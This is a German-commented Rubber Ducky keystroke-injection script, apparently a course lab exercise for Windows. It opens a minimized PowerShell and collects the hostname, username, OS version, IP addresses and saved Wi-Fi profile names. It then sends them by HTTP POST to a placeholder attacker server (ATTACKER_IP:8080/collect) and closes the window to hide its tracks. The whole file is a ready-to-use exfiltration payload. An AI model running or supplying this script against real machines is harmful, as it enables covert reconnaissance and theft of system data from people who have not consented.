REM ============================================================
REM  W02a.2 – Rubber Ducky: Information Gathering
REM  Autoren: Raphael Bleier, Joachim Lugger
REM  Ziel-OS: Windows
REM  Beschreibung: Sammelt System- und WLAN-Infos und sendet
REM                sie per HTTP an einen lokalen Webserver
REM
REM  Voraussetzung: Python-Server läuft auf ATTACKER_IP:8080
REM  Ersetze ATTACKER_IP mit der echten IP-Adresse!
REM ============================================================

DELAY 2000

REM Minimiertes PowerShell-Fenster öffnen
GUI r
DELAY 500
STRINGLN powershell -WindowStyle Minimized
DELAY 1500

REM Systeminformationen sammeln
STRINGLN $hostname = $env:COMPUTERNAME
DELAY 200
STRINGLN $user = $env:USERNAME
DELAY 200
STRINGLN $os = (Get-WmiObject Win32_OperatingSystem).Caption
DELAY 200
STRINGLN $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike '127*'} | Select-Object -ExpandProperty IPAddress) -join ','
DELAY 200

REM WLAN-Profile auslesen (Profilnamen)
STRINGLN $wifi = (netsh wlan show profiles) | Out-String
DELAY 500

REM Alle Infos kombinieren
STRINGLN $body = "HOSTNAME=$hostname`nUSER=$user`nOS=$os`nIP=$ip`nWIFI_PROFILES=$wifi"
DELAY 200

REM Per HTTP POST an den Angreifer-Server senden (curl-Alias in PS)
STRINGLN Invoke-WebRequest -Uri 'http://ATTACKER_IP:8080/collect' -Method POST -Body $body -UseBasicParsing
DELAY 3000

REM Fenster schließen und Spuren verwischen
STRINGLN exit
DELAY 500
